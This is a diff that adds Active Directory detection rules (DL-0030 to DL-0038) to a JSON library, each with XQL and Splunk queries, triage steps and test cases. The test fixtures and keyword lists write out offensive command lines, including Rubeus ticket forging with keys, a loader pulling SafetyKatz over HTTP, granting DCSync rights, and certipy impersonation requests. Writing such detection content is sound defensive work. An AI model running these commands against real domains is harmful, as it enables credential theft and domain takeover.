@@ -2653,6 +2653,2543 @@
      }
     ]
    }
+  },
+  {
+   "id": "DL-0030",
+   "title": "PowerView or PowerSploit AD recon functions on the command line",
+   "description": "PowerView and PowerSploit functions that map users, groups, ACLs, sessions, shares, local admin access and trusts (Get-DomainUser, Find-InterestingDomainAcl, Invoke-ShareFinder, Find-LocalAdminAccess, Get-DomainTrust...). In an AD intrusion this is the step that finds the path to Domain Admin.",
+   "attack": [
+    "T1087.002",
+    "T1069.002",
+    "T1482",
+    "T1135"
+   ],
+   "tactic": "discovery",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "functions": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "get-domainuser",
+       "get-domaingroupmember",
+       "get-domaincomputer",
+       "get-domainobjectacl",
+       "find-interestingdomainacl",
+       "invoke-sharefinder",
+       "find-localadminaccess",
+       "find-domainuserlocation",
+       "invoke-userhunter",
+       "get-domaintrust",
+       "get-forestdomain",
+       "get-domaingpo",
+       "get-netsession",
+       "get-netloggedon",
+       "find-psremotinglocaladminaccess",
+       "find-wmilocaladminaccess",
+       "get-domainforeigngroupmember"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "functions"
+   },
+   "condition_text": "functions",
+   "triage": [
+    "Find out how PowerView got there. It is usually loaded in memory, so check PowerShell 4104 script blocks (DL-0044) on the same host.",
+    {
+     "Look at what came next from the same account": "ACL changes (DL-0034, 5136 events), new logons on servers, Kerberos ticket requests."
+    }
+   ],
+   "false_positives": [
+    "Authorised penetration tests. Some AD audit scripts reuse PowerView function names."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line contains \"get-domainuser\" or action_process_image_command_line contains \"get-domaingroupmember\" or action_process_image_command_line contains \"get-domaincomputer\" or action_process_image_command_line contains \"get-domainobjectacl\" or action_process_image_command_line contains \"find-interestingdomainacl\" or action_process_image_command_line contains \"invoke-sharefinder\" or action_process_image_command_line contains \"find-localadminaccess\" or action_process_image_command_line contains \"find-domainuserlocation\" or action_process_image_command_line contains \"invoke-userhunter\" or action_process_image_command_line contains \"get-domaintrust\" or action_process_image_command_line contains \"get-forestdomain\" or action_process_image_command_line contains \"get-domaingpo\" or action_process_image_command_line contains \"get-netsession\" or action_process_image_command_line contains \"get-netloggedon\" or action_process_image_command_line contains \"find-psremotinglocaladminaccess\" or action_process_image_command_line contains \"find-wmilocaladminaccess\" or action_process_image_command_line contains \"get-domainforeigngroupmember\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where match(CommandLine, \"(?i)get\\\\-domainuser\") OR match(CommandLine, \"(?i)get\\\\-domaingroupmember\") OR match(CommandLine, \"(?i)get\\\\-domaincomputer\") OR match(CommandLine, \"(?i)get\\\\-domainobjectacl\") OR match(CommandLine, \"(?i)find\\\\-interestingdomainacl\") OR match(CommandLine, \"(?i)invoke\\\\-sharefinder\") OR match(CommandLine, \"(?i)find\\\\-localadminaccess\") OR match(CommandLine, \"(?i)find\\\\-domainuserlocation\") OR match(CommandLine, \"(?i)invoke\\\\-userhunter\") OR match(CommandLine, \"(?i)get\\\\-domaintrust\") OR match(CommandLine, \"(?i)get\\\\-forestdomain\") OR match(CommandLine, \"(?i)get\\\\-domaingpo\") OR match(CommandLine, \"(?i)get\\\\-netsession\") OR match(CommandLine, \"(?i)get\\\\-netloggedon\") OR match(CommandLine, \"(?i)find\\\\-psremotinglocaladminaccess\") OR match(CommandLine, \"(?i)find\\\\-wmilocaladminaccess\") OR match(CommandLine, \"(?i)get\\\\-domainforeigngroupmember\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell -c \". .\\PowerView.ps1; Find-InterestingDomainAcl -ResolveGUIDs\""
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Invoke-ShareFinder -CheckShareAccess -Verbose"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Get-ADUser -Identity s.benali"
+     },
+     {
+      "process.name": "net.exe",
+      "process.command_line": "net use Z: \\\\fs01\\share"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0031",
+   "title": "Rubeus requests, forges or injects Kerberos tickets",
+   "description": "Rubeus verbs used after the first foothold: asktgt with a hash or key (overpass-the-hash), s4u (delegation abuse), ptt (pass-the-ticket), tgtdeleg, golden, silver and diamond ticket forging, and monitor (catching TGTs on a host with unconstrained delegation). Also catches Rubeus run through an in-memory loader, since the arguments stay on the command line.",
+   "attack": [
+    "T1558",
+    "T1550.003",
+    "T1550.002"
+   ],
+   "tactic": "credential-access",
+   "severity": "critical",
+   "logsource": "process_creation",
+   "selections": {
+    "rubeus_verb": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\b(asktgt|asktgs|s4u|ptt|tgtdeleg|golden|silver|diamond|monitor|harvest|dump|triage|createnetonly|renew)\\b"
+      ]
+     }
+    ],
+    "ticket_args": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "/rc4:",
+       "/aes256:",
+       "/aes128:",
+       "/ticket:",
+       "/impersonateuser:",
+       "/msdsspn:",
+       "/certificate:",
+       "/krbkey:",
+       "/ptt",
+       "/nowrap",
+       "/interval:"
+      ]
+     }
+    ],
+    "rubeus_name": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "rubeus"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "rubeus_verb"
+     },
+     {
+      "or": [
+       {
+        "sel": "ticket_args"
+       },
+       {
+        "sel": "rubeus_name"
+       }
+      ]
+     }
+    ]
+   },
+   "condition_text": "rubeus_verb and (ticket_args or rubeus_name)",
+   "triage": [
+    "/rc4: or /aes256: means a stolen key is being used: find where it came from (LSASS dump, DCSync) and reset that account.",
+    "s4u with /impersonateuser points to delegation abuse: check msDS-AllowedToActOnBehalfOfOtherIdentity and msDS-AllowedToDelegateTo on the target service.",
+    "golden, silver or diamond means forged tickets. Plan a double krbtgt reset if krbtgt keys were exposed."
+   ],
+   "false_positives": [
+    "Red team exercises. klist and normal Kerberos use do not match."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_command_line ~= \"(?i)\\\\b(asktgt|asktgs|s4u|ptt|tgtdeleg|golden|silver|diamond|monitor|harvest|dump|triage|createnetonly|renew)\\\\b\" and ((action_process_image_command_line contains \"/rc4:\" or action_process_image_command_line contains \"/aes256:\" or action_process_image_command_line contains \"/aes128:\" or action_process_image_command_line contains \"/ticket:\" or action_process_image_command_line contains \"/impersonateuser:\" or action_process_image_command_line contains \"/msdsspn:\" or action_process_image_command_line contains \"/certificate:\" or action_process_image_command_line contains \"/krbkey:\" or action_process_image_command_line contains \"/ptt\" or action_process_image_command_line contains \"/nowrap\" or action_process_image_command_line contains \"/interval:\") or action_process_image_command_line contains \"rubeus\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where match(CommandLine, \"(?i)\\\\b(asktgt|asktgs|s4u|ptt|tgtdeleg|golden|silver|diamond|monitor|harvest|dump|triage|createnetonly|renew)\\\\b\") AND ((match(CommandLine, \"(?i)/rc4:\") OR match(CommandLine, \"(?i)/aes256:\") OR match(CommandLine, \"(?i)/aes128:\") OR match(CommandLine, \"(?i)/ticket:\") OR match(CommandLine, \"(?i)/impersonateuser:\") OR match(CommandLine, \"(?i)/msdsspn:\") OR match(CommandLine, \"(?i)/certificate:\") OR match(CommandLine, \"(?i)/krbkey:\") OR match(CommandLine, \"(?i)/ptt\") OR match(CommandLine, \"(?i)/nowrap\") OR match(CommandLine, \"(?i)/interval:\")) OR match(CommandLine, \"(?i)rubeus\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "rubeus.exe",
+      "process.command_line": "Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /ptt"
+     },
+     {
+      "process.name": "loader.exe",
+      "process.command_line": "Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:aaaa /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mgmt /ptt"
+     },
+     {
+      "process.name": "rubeus.exe",
+      "process.command_line": "Rubeus.exe monitor /interval:5 /nowrap"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "klist.exe",
+      "process.command_line": "klist purge"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Write-Host \"golden hour photo export\""
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0032",
+   "title": "AD CS abuse tool looks for or requests vulnerable certificates",
+   "description": "Certify, Certipy and ForgeCert used to find vulnerable certificate templates (ESC1 to ESC8), request a certificate as another user, or forge one with a stolen CA key. A certificate gives a login that survives password resets.",
+   "attack": [
+    "T1649"
+   ],
+   "tactic": "credential-access",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "certify": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "certify"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\b(find|request|download|cas|pkiobjects)\\b"
+      ]
+     }
+    ],
+    "certipy": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "certipy"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\b(find|req|auth|shadow|forge|ca)\\b"
+      ]
+     }
+    ],
+    "forge": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "forgecert",
+       "/onbehalfof:",
+       "/altname:",
+       "-upn "
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "or": [
+       {
+        "sel": "certify"
+       },
+       {
+        "sel": "certipy"
+       }
+      ]
+     },
+     {
+      "sel": "forge"
+     }
+    ]
+   },
+   "condition_text": "certify or certipy or forge",
+   "triage": [
+    "Check CA events 4886 and 4887 for certificates issued to the same requester around that time (DL-0061).",
+    "Revoke any certificate issued to a privileged account that was not expected, and fix the template (enrollment rights, ENROLLEE_SUPPLIES_SUBJECT, Certificate Request Agent EKU)."
+   ],
+   "false_positives": [
+    "PKI admins auditing templates with Certify or Certipy find. Confirm with the PKI team."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter ((action_process_image_command_line contains \"certify\" and action_process_image_command_line ~= \"(?i)\\\\b(find|request|download|cas|pkiobjects)\\\\b\") or (action_process_image_command_line contains \"certipy\" and action_process_image_command_line ~= \"(?i)\\\\b(find|req|auth|shadow|forge|ca)\\\\b\")) or (action_process_image_command_line contains \"forgecert\" or action_process_image_command_line contains \"/onbehalfof:\" or action_process_image_command_line contains \"/altname:\" or action_process_image_command_line contains \"-upn \")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((match(CommandLine, \"(?i)certify\") AND match(CommandLine, \"(?i)\\\\b(find|request|download|cas|pkiobjects)\\\\b\")) OR (match(CommandLine, \"(?i)certipy\") AND match(CommandLine, \"(?i)\\\\b(find|req|auth|shadow|forge|ca)\\\\b\"))) OR (match(CommandLine, \"(?i)forgecert\") OR match(CommandLine, \"(?i)/onbehalfof:\") OR match(CommandLine, \"(?i)/altname:\") OR match(CommandLine, \"(?i)\\\\-upn\\\\ \"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "certify.exe",
+      "process.command_line": "Certify.exe find /vulnerable"
+     },
+     {
+      "process.name": "loader.exe",
+      "process.command_line": "Loader.exe -path .\\Certify.exe -args request /ca:dc01.corp.local\\corp-DC01-CA /template:Users /onbehalfof:corp\\administrator /enrollcert:agent.pfx"
+     },
+     {
+      "process.name": "python.exe",
+      "process.command_line": "certipy req -u user@corp.local -ca corp-CA -template ESC1 -upn administrator@corp.local"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "certutil.exe",
+      "process.command_line": "certutil -viewstore my"
+     },
+     {
+      "process.name": "certreq.exe",
+      "process.command_line": "certreq -submit request.req"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0033",
+   "title": "In-memory .NET loader runs an offensive tool",
+   "description": "Loaders such as NetLoader take a path or URL to a .NET assembly, patch AMSI and ETW, and run the tool from memory so it never touches disk (Loader.exe -path ... -args ...). The tool names usually stay visible in the arguments.",
+   "attack": [
+    "T1620",
+    "T1562.001",
+    "T1027"
+   ],
+   "tactic": "defense-evasion",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "loader_syntax": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "-path",
+       "-args"
+      ]
+     }
+    ],
+    "remote_or_tool": [
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(https?://|\\\\\\\\|rubeus|safetykatz|certify|sharphound|seatbelt|standin|sharpup|winpeas)"
+      ]
+     }
+    ],
+    "netloader": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "netloader",
+       "loader.exe -path"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "and": [
+       {
+        "sel": "loader_syntax"
+       },
+       {
+        "sel": "remote_or_tool"
+       }
+      ]
+     },
+     {
+      "sel": "netloader"
+     }
+    ]
+   },
+   "condition_text": "(loader_syntax and remote_or_tool) or netloader",
+   "triage": [
+    "The URL in -path is often a local port forward (netsh portproxy, DL-0035) to the attacker's server. Find the listener.",
+    "Read the -args value. It tells you which tool ran and what it did (DL-0031 for Rubeus, DL-0019 for SafetyKatz)."
+   ],
+   "false_positives": [
+    "Rare. Some deployment tools accept -path and -args; they do not point at offensive assemblies."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter ((action_process_image_command_line contains \"-path\" and action_process_image_command_line contains \"-args\") and action_process_image_command_line ~= \"(?i)(https?://|\\\\\\\\\\\\\\\\|rubeus|safetykatz|certify|sharphound|seatbelt|standin|sharpup|winpeas)\") or (action_process_image_command_line contains \"netloader\" or action_process_image_command_line contains \"loader.exe -path\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((match(CommandLine, \"(?i)\\\\-path\") AND match(CommandLine, \"(?i)\\\\-args\")) AND match(CommandLine, \"(?i)(https?://|\\\\\\\\\\\\\\\\|rubeus|safetykatz|certify|sharphound|seatbelt|standin|sharpup|winpeas)\")) OR (match(CommandLine, \"(?i)netloader\") OR match(CommandLine, \"(?i)loader\\\\.exe\\\\ \\\\-path\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "loader.exe",
+      "process.command_line": "C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args \"sekurlsa::evasive-keys\" \"exit\""
+     },
+     {
+      "process.name": "loader.exe",
+      "process.command_line": "Loader.exe -path \\\\10.0.0.5\\share\\Rubeus.exe -args kerberoast"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "msiexec.exe",
+      "process.command_line": "msiexec /i agent.msi /qn"
+     },
+     {
+      "process.name": "setup.exe",
+      "process.command_line": "setup.exe -path C:\\Program Files\\App -args /silent"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0034",
+   "title": "AD object rights or memberships changed with PowerView or StandIn",
+   "description": "Write actions from PowerView and StandIn: granting rights on an object (Add-DomainObjectAcl, including DCSync rights), setting attributes (Set-DomainObject), adding group members, resetting passwords, or writing resource-based constrained delegation (StandIn --computer --sid). These turn a weak ACL into a working escalation path.",
+   "attack": [
+    "T1098"
+   ],
+   "tactic": "privilege-escalation",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "powerview_write": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "add-domainobjectacl",
+       "set-domainobject",
+       "add-domaingroupmember",
+       "set-domainuserpassword",
+       "set-domainobjectowner",
+       "add-objectacl"
+      ]
+     }
+    ],
+    "standin_write": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "standin"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(--computer\\b.*--sid|--group\\b.*--add|--setuserrights|--grant|--spn|--setpassword)"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "powerview_write"
+     },
+     {
+      "sel": "standin_write"
+     }
+    ]
+   },
+   "condition_text": "powerview_write or standin_write",
+   "triage": [
+    "On the DC, find the matching 5136 (attribute changed) or 4728/4732/4756 (member added) events and the object that changed.",
+    "Undo the change, then look for what the attacker did with it next (new delegation, DCSync, password reset logon)."
+   ],
+   "false_positives": [
+    "AD administrators using PowerView in scripts. Uncommon; most admins use the ActiveDirectory module."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_command_line contains \"add-domainobjectacl\" or action_process_image_command_line contains \"set-domainobject\" or action_process_image_command_line contains \"add-domaingroupmember\" or action_process_image_command_line contains \"set-domainuserpassword\" or action_process_image_command_line contains \"set-domainobjectowner\" or action_process_image_command_line contains \"add-objectacl\") or (action_process_image_command_line contains \"standin\" and action_process_image_command_line ~= \"(?i)(--computer\\\\b.*--sid|--group\\\\b.*--add|--setuserrights|--grant|--spn|--setpassword)\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where (match(CommandLine, \"(?i)add\\\\-domainobjectacl\") OR match(CommandLine, \"(?i)set\\\\-domainobject\") OR match(CommandLine, \"(?i)add\\\\-domaingroupmember\") OR match(CommandLine, \"(?i)set\\\\-domainuserpassword\") OR match(CommandLine, \"(?i)set\\\\-domainobjectowner\") OR match(CommandLine, \"(?i)add\\\\-objectacl\")) OR (match(CommandLine, \"(?i)standin\") AND match(CommandLine, \"(?i)(--computer\\\\b.*--sid|--group\\\\b.*--add|--setuserrights|--grant|--spn|--setpassword)\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Add-DomainObjectAcl -TargetIdentity \"dc=corp,dc=local\" -PrincipalIdentity studentx -Rights DCSync"
+     },
+     {
+      "process.name": "standin.exe",
+      "process.command_line": "StandIn.exe --computer srv01 --sid S-1-5-21-1-2-3-1106"
+     },
+     {
+      "process.name": "standin.exe",
+      "process.command_line": "StandIn.exe --group Management --ntaccount \"corp\\svc\" --add"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "standin.exe",
+      "process.command_line": "StandIn.exe --group \"Domain Admins\""
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Get-DomainObjectAcl -Identity srv01"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0035",
+   "title": "netsh port proxy set up to forward traffic",
+   "description": "netsh interface portproxy add v4tov4 makes Windows forward a local port to another host. Attackers use it to reach their tool server from a segmented host, for example to serve an in-memory loader over http://127.0.0.1:8080, or to pivot to an internal service.",
+   "attack": [
+    "T1090.001"
+   ],
+   "tactic": "command-and-control",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "netsh.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "portproxy",
+       "add"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Run netsh interface portproxy show all on the host and check where connectaddress points.",
+    "Look for downloads from 127.0.0.1 on the listen port right after (loaders, DL-0033)."
+   ],
+   "false_positives": [
+    "Admins forwarding a port for a legacy application. These are long-lived and documented."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"netsh.exe\" and (action_process_image_command_line contains \"portproxy\" and action_process_image_command_line contains \"add\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"netsh.exe\" AND (match(CommandLine, \"(?i)portproxy\") AND match(CommandLine, \"(?i)add\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "netsh.exe",
+      "process.command_line": "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.5"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "netsh.exe",
+      "process.command_line": "netsh interface portproxy show all"
+     },
+     {
+      "process.name": "netsh.exe",
+      "process.command_line": "netsh advfirewall firewall add rule name=\"App\" dir=in action=allow protocol=TCP localport=443"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0036",
+   "title": "winrs runs a command on another host",
+   "description": "winrs -r:host runs a command on a remote machine over WinRM. It is the source side of DL-0024 and shows up on the attacker's foothold, often right after a Kerberos ticket was injected for the target.",
+   "attack": [
+    "T1021.006"
+   ],
+   "tactic": "lateral-movement",
+   "severity": "medium",
+   "logsource": "process_creation",
+   "selections": {
+    "selection": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "winrs.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "re",
+      "all": false,
+      "values": [
+       "(-|/)r(emote)?:"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "selection"
+   },
+   "condition_text": "selection",
+   "triage": [
+    "Check the target host for wsmprovhost.exe children (DL-0024) and the type 3 logon in its Security log.",
+    "If the same session injected a ticket just before (DL-0031), treat the account on the target as compromised."
+   ],
+   "false_positives": [
+    "Admins who use winrs for remote maintenance. Baseline who and from where."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"winrs.exe\" and action_process_image_command_line ~= \"(?i)(-|/)r(emote)?:\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where lower(process_name)=\"winrs.exe\" AND match(CommandLine, \"(?i)(-|/)r(emote)?:\")\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "process.name": "winrs.exe",
+      "process.command_line": "winrs -r:dcorp-mgmt cmd /c \"set computername && set username\""
+     },
+     {
+      "process.name": "winrs.exe",
+      "process.command_line": "winrs /remote:srv01.corp.local hostname"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "winrm.cmd",
+      "process.command_line": "winrm quickconfig"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0037",
+   "title": "Account added to the local Administrators group from the command line",
+   "description": "net localgroup administrators <user> /add, or Add-LocalGroupMember. Local privilege escalation exploits (for example a service abuse with PowerUp) often end with exactly this command run as SYSTEM.",
+   "attack": [
+    "T1098"
+   ],
+   "tactic": "persistence",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "net": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "net.exe",
+       "net1.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "localgroup",
+       "administrators",
+       "/add"
+      ]
+     }
+    ],
+    "powershell": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "add-localgroupmember",
+       "administrators"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "net"
+     },
+     {
+      "sel": "powershell"
+     }
+    ]
+   },
+   "condition_text": "net or powershell",
+   "triage": [
+    "Check the parent. services.exe or a vulnerable service binary as parent means local privilege escalation through a service.",
+    "Remove the account from the group and find how it got SYSTEM."
+   ],
+   "false_positives": [
+    "Build scripts and helpdesk tools that grant local admin. They run from known parents and accounts."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter (action_process_image_name in (\"net.exe\", \"net1.exe\") and (action_process_image_command_line contains \"localgroup\" and action_process_image_command_line contains \"administrators\" and action_process_image_command_line contains \"/add\")) or (action_process_image_command_line contains \"add-localgroupmember\" and action_process_image_command_line contains \"administrators\")\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_process_image_name, action_process_image_command_line\n| sort desc _time\n| limit 1000\n",
+   "spl": "`sysmon` EventCode=1\n| eval process_name=lower(mvindex(split(Image,\"\\\\\"),-1)), parent_name=lower(mvindex(split(ParentImage,\"\\\\\"),-1))\n| where ((lower(process_name)=\"net.exe\" OR lower(process_name)=\"net1.exe\") AND (match(CommandLine, \"(?i)localgroup\") AND match(CommandLine, \"(?i)administrators\") AND match(CommandLine, \"(?i)/add\"))) OR (match(CommandLine, \"(?i)add\\\\-localgroupmember\") AND match(CommandLine, \"(?i)administrators\"))\n| table _time host User ParentImage Image CommandLine\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "parent.name": "abyss.exe",
+      "process.name": "net.exe",
+      "process.command_line": "net localgroup Administrators dcorp\\student1 /add"
+     },
+     {
+      "process.name": "powershell.exe",
+      "process.command_line": "powershell Add-LocalGroupMember -Group Administrators -Member corp\\svc"
+     }
+    ],
+    "no_match": [
+     {
+      "process.name": "net.exe",
+      "process.command_line": "net localgroup Administrators"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0038",
+   "title": "Service binary path changed with sc config",
+   "description": "sc config <service> binPath= points an existing service at a new command. With weak service permissions, any user can do this and get code running as SYSTEM on the next service start. PowerUp's Invoke-ServiceAbuse does the same thing.",
+   "attack": [
+    "T1574.011",
+    "T1543.003"
+   ],
+   "tactic": "privilege-escalation",
+   "severity": "high",
+   "logsource": "process_creation",
+   "selections": {
+    "sc_config": [
+     {
+      "field": "process.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "sc.exe"
+      ]
+     },
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": true,
+      "values": [
+       "config",
+       "binpath"
+      ]
+     }
+    ],
+    "powerup": [
+     {
+      "field": "process.command_line",
+      "op": "contains",
+      "all": false,
+      "values": [
+       "invoke-serviceabuse",
+       "write-servicebinary",
+       "install-servicebinary"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "or": [
+     {
+      "sel": "sc_config"
+     },
+     {
+      "sel": "powerup"
+     }
+    ]
+   },
+   "condition_text": "sc_config or powerup",
+   "triage": [
+    "Read the new binPath. cmd.exe, net.exe or a file in a user-writable folder means abuse.",
+    "Restore the service config and fix the service ACL (sc sdshow)."
+   ],
+   "false_positives": [
+    "Software installers reconfiguring their own service. They do not point binPath at cmd.exe or net.exe."
+   ],
